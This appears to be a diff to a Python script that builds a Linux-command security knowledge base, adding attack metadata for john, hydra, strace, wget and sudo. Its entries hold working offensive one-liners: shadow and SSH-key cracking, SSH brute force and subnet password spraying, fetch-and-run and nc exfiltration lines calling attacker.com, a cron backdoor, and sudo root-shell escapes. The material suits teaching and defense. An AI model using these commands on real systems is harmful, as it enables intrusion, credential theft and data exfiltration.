+            "john --format=NT hashes.txt --wordlist=rockyou.txt  # NTLM hashes",
+            "john --show shadow.txt                    # display cracked passwords",
+            "john --rules --wordlist=rockyou.txt shadow.txt  # with mangling rules",
+            "zip2john archive.zip > zip.hash && john zip.hash  # crack zip password",
+        ],
+        "combinations": [
+            {"with": "dd", "example": "dd if=/dev/sda | grep -a 'NTLM' | tee ntlm.raw  # extract hashes from raw image", "note": "Disk forensics → hash extraction → cracking pipeline"},
+            {"with": "awk", "example": "awk -F: '{print $1\":\"$2}' /etc/shadow | john --stdin --format=crypt", "note": "Pipe shadow directly to john"},
+            {"with": "ssh", "example": "ssh2john ~/.ssh/id_rsa > rsa.hash && john rsa.hash --wordlist=rockyou.txt", "note": "Crack passphrase-protected private key"},
+        ],
+        "cve_refs": [],
+        "ctf_categories": ["crypto", "pwn"],
+        "root_vs_user": {
+            "root": "Can read /etc/shadow directly — no need to first obtain it via exploit",
+            "user": "Needs shadow already exfiltrated; cracking itself requires no privileges",
+        },
+    },
+    "hydra": {
+        "hat": "black",
+        "security_intent": "Network brute-force tool. Supports 50+ protocols: SSH, FTP, HTTP forms, RDP, SMTP, databases. Used for credential stuffing, password spraying, and service brute-force in penetration tests.",
+        "attack_vectors": ["SSH brute force", "HTTP form credential stuffing", "FTP/SMTP brute force", "RDP password spray", "database authentication brute force"],
+        "defense_use": "Testing account lockout policies, validating rate limiting, identifying weak service credentials.",
+        "mitre_tags": ["T1110.001", "T1110.003", "T1078"],
+        "threat_level": 5,
+        "related_commands": ["nmap", "ssh", "curl", "nc"],
+        "quick_use": [
+            "hydra -l admin -P rockyou.txt ssh://10.0.0.1  # SSH brute force",
+            "hydra -L users.txt -P passwords.txt ftp://10.0.0.1",
+            "hydra -l admin -P rockyou.txt 10.0.0.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
+            "hydra -L users.txt -p 'Summer2024!' ssh://10.0.0.0/24  # password spray subnet",
+            "hydra -l root -P rockyou.txt mysql://10.0.0.1",
+        ],
+        "combinations": [
+            {"with": "nmap", "example": "nmap -p 22 --open 10.0.0.0/24 -oG - | awk '/open/{print $2}' > ssh_hosts.txt && hydra -L users.txt -P rockyou.txt -M ssh_hosts.txt ssh", "note": "Auto-discover SSH hosts then brute force all of them"},
+            {"with": "curl", "example": "# First: use curl to identify login form params\ncurl -si http://target.com/login | grep 'name='\n# Then: hydra -l admin -P rockyou.txt target.com http-post-form '/login:...'", "note": "Recon form params with curl before hydra"},
+        ],
+        "cve_refs": [],
+        "ctf_categories": ["web", "network", "pwn"],
+        "root_vs_user": {
+            "root": "No functional difference for network attacks; can use more source ports and raw sockets",
+            "user": "Full functionality for all supported protocols; no root needed",
+        },
+    },
+    "strace": {
+        "hat": "red",
+        "security_intent": "System call tracer. Reveals exactly what a program does at the kernel boundary: file opens, network connections, exec calls, memory operations. Attackers use it to extract hardcoded credentials passed as arguments, discover hidden config files, and reverse engineer binary behavior.",
+        "attack_vectors": ["credential extraction from process arguments", "config file path discovery", "binary behavior analysis", "anti-debug detection bypass"],
+        "defense_use": "Debugging unexpected program behavior, incident response analysis of suspicious processes, malware behavior analysis.",
+        "mitre_tags": ["T1057", "T1059.004", "T1552.004"],
+        "threat_level": 3,
+        "related_commands": ["ps", "lsof", "find", "grep"],
+        "quick_use": [
+            "strace -p PID                             # attach to running process",
+            "strace -e openat,read,write -p PID        # trace only file operations",
+            "strace -e execve command 2>&1 | grep exec # trace child process spawning",
+            "strace -s 9999 -e read,write ./binary 2>&1 | grep -A2 'read('  # dump I/O",
+            "strace -f -e network ./binary 2>&1        # trace network syscalls + forks",
+        ],
+        "combinations": [
+            {"with": "grep", "example": "strace -e openat ./suspicious_binary 2>&1 | grep -v ENOENT | grep '\"/'", "note": "List all files the binary successfully opens"},
+            {"with": "awk", "example": "strace -c ./binary 2>&1 | awk 'NR>2{print $NF, $1}' | sort -rn | head", "note": "Profile which syscalls take the most time"},
+            {"with": "ps", "example": "ps aux | grep target_process | awk '{print $2}' | xargs strace -p", "note": "Auto-attach strace to a named process"},
+        ],
+        "cve_refs": [],
+        "ctf_categories": ["pwn", "reversing"],
+        "root_vs_user": {
+            "root": "Can trace any process including system daemons; no ptrace_scope restrictions",
+            "user": "Restricted by /proc/sys/kernel/yama/ptrace_scope; default on many distros blocks tracing other users' processes",
+        },
+    },
+    "wget": {
+        "hat": "red",
+        "security_intent": "File retrieval tool with recursive crawling and mirror capability. Attackers use it to download payloads from C2 servers, spider internal web apps, and transfer exfiltrated data. `wget` is often present where `curl` is not.",
+        "attack_vectors": ["payload delivery from C2", "internal web app spidering", "credential exposure via basic-auth URL", "recursive download for data exfil"],
+        "defense_use": "Downloading security patches, mirroring documentation, fetching threat intelligence feeds.",
+        "mitre_tags": ["T1105", "T1071.001", "T1567"],
+        "threat_level": 3,
+        "related_commands": ["curl", "nc", "python3"],
+        "quick_use": [
+            "wget -q http://10.0.0.1:8080/payload.sh -O- | bash  # download and execute",
+            "wget -r -np -k http://internal.corp/         # mirror entire site",
+            "wget --no-check-certificate https://10.0.0.1/file  # skip TLS verification",
+            "wget -P /tmp http://10.0.0.1:8080/shell.elf  # save payload to /tmp",
+            "wget -q -O- http://169.254.169.254/latest/meta-data/  # AWS IMDS SSRF",
+        ],
+        "combinations": [
+            {"with": "bash", "example": "wget -qO- http://attacker.com/rev.sh | bash", "note": "One-liner fileless payload execution"},
+            {"with": "python3", "example": "python3 -m http.server 8080 & wget http://localhost:8080/test  # test delivery", "note": "Verify payload delivery chain locally"},
+            {"with": "nc", "example": "wget -q http://attacker.com/payload && nc attacker.com 4444 < payload", "note": "Download then exfil via nc"},
+        ],
+        "cve_refs": ["CVE-2021-31879 (wget cookie injection via redirect)", "CVE-2019-5953 (stack overflow in wget)"],
+        "ctf_categories": ["web", "network"],
+        "root_vs_user": {
+            "root": "Can write anywhere; `wget -O /etc/cron.d/backdoor http://...` for persistence",
+            "user": "Writes to user-writable paths; still fully functional for payload delivery",
+        },
+    },
+    "sudo": {
+        "hat": "black",
+        "security_intent": "Privilege delegation tool that is simultaneously the most common Linux privilege escalation vector. Misconfigured sudoers entries (NOPASSWD, wildcards, GTFOBins-eligible commands) give attackers immediate root. `sudo -l` is always the first post-access command.",
+        "attack_vectors": ["sudo -l privilege enumeration", "GTFOBins sudo escalation", "wildcard injection in sudo commands", "LD_PRELOAD environment variable abuse", "CVE-2021-3156 Baron Samedit heap overflow"],
+        "defense_use": "Controlled privilege delegation, audit trail of elevated commands via syslog.",
+        "mitre_tags": ["T1548.003", "T1069.001", "T1078.003"],
+        "threat_level": 5,
+        "related_commands": ["find", "python3", "awk", "vi"],
+        "quick_use": [
+            "sudo -l                                   # list allowed commands — always run first",
+            "sudo -u victim command                    # run as another user",
+            "sudo bash                                 # root shell if sudo bash is allowed",
+            "sudo find / -exec /bin/bash \\;           # GTFOBins via find",
+            "sudo awk 'BEGIN{system(\"/bin/bash\")}'    # GTFOBins via awk",
+        ],
+        "combinations": [
+            {"with": "find", "example": "sudo find / -exec /bin/bash -ip \\;", "note": "Escalate to root shell via sudo find — GTFOBins classic"},
+            {"with": "python3", "example": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'", "note": "Instant root if python3 in sudoers"},
+            {"with": "awk", "example": "sudo awk 'BEGIN{system(\"/bin/sh\")}'", "note": "GTFOBins awk shell escape"},
+        ],
+        "cve_refs": ["CVE-2021-3156 (Baron Samedit — heap overflow RCE)", "CVE-2021-3560 (authentication bypass)", "CVE-2019-14287 (sudo -u#-1 bypass)"],
+        "ctf_categories": ["linux", "pwn"],
+        "root_vs_user": {
+            "root": "Full sudo functionality; can configure sudoers; can sudo as any user",
+            "user": "`sudo -l` reveals the attack surface; single misconfigured entry gives root",
+        },
+    },
+}
+
+# ---------------------------------------------------------------------------
+# Merge supplementary fields into SECURITY_METADATA at get_meta() time
+# ---------------------------------------------------------------------------
+
 def load_cache():
     if os.path.exists(CACHE_PATH):
         with open(CACHE_PATH) as f:
@@ -2456,7 +3093,36 @@ def get_meta(command):
         "related_commands": [],
     })
     extras = COMMAND_EXTRAS.get(key, {})
-    return {**base, "quick_use": extras.get("quick_use", []), "combinations": extras.get("combinations", [])}
+    return {
+        **base,
+        "quick_use": extras.get("quick_use", []),
+        "combinations": extras.get("combinations", []),
+        "cve_refs": CVE_REFS.get(key, []),
+        "ctf_categories": CTF_TAGS.get(key, []),
+        "root_vs_user": ROOT_VS_USER.get(key, {}),
+    }
+
+def build_extra_tool(command, data):
+    return {
+        "id": f"extra_{command}",
+        "title": f"The '{command}' Command In Linux",
+        "command": command,
+        "hat": data["hat"],
+        "security_intent": data["security_intent"],
+        "attack_vectors": data["attack_vectors"],
+        "defense_use": data["defense_use"],
+        "mitre_tags": data["mitre_tags"],
+        "threat_level": data["threat_level"],
+        "related_commands": data["related_commands"],
+        "quick_use": data.get("quick_use", []),
+        "combinations": data.get("combinations", []),
+        "cve_refs": data.get("cve_refs", []),
+        "ctf_categories": data.get("ctf_categories", []),
+        "root_vs_user": data.get("root_vs_user", {}),
+        "transcript": "",
+        "video_url": "",
+        "extra": True,
+    }
 
 def main():
     os.makedirs(os.path.dirname(OUT_PATH), exist_ok=True)
@@ -2496,19 +3162,27 @@ def main():
             "related_commands": meta["related_commands"],
             "quick_use": meta["quick_use"],
             "combinations": meta["combinations"],
+            "cve_refs": meta["cve_refs"],
+            "ctf_categories": meta["ctf_categories"],
+            "root_vs_user": meta["root_vs_user"],
             "transcript": transcript,
             "video_url": f"https://www.youtube.com/watch?v={vid_id}",
+            "extra": False,
         })
 
+    extra_tools = [build_extra_tool(cmd, data) for cmd, data in EXTRA_TOOLS.items()]
+    all_entries = videos + extra_tools
+
     hat_counts = {"black": 0, "red": 0, "blue": 0, "gray": 0}
-    for v in videos:
+    for v in all_entries:
         hat_counts[v["hat"]] = hat_counts.get(v["hat"], 0) + 1
 
     knowledge = {
         "generated_at": datetime.utcnow().isoformat() + "Z",
         "total_videos": len(videos),
+        "total_tools": len(all_entries),
         "hat_counts": hat_counts,
-        "videos": videos,
+        "videos": all_entries,
         "attack_chains": ATTACK_CHAINS + EXTRA_CHAINS,
     }
 
@@ -2516,7 +3190,9 @@ def main():
         json.dump(knowledge, f, ensure_ascii=False, indent=2)
 
     print(f"\nDone. Saved to {OUT_PATH}")
+    print(f"Playlist videos: {len(videos)} | Extra tools: {len(extra_tools)} | Total: {len(all_entries)}")
     print(f"Hat breakdown: {hat_counts}")
+    print(f"Attack chains: {len(ATTACK_CHAINS + EXTRA_CHAINS)}")
 
 if __name__ == "__main__":
     main()
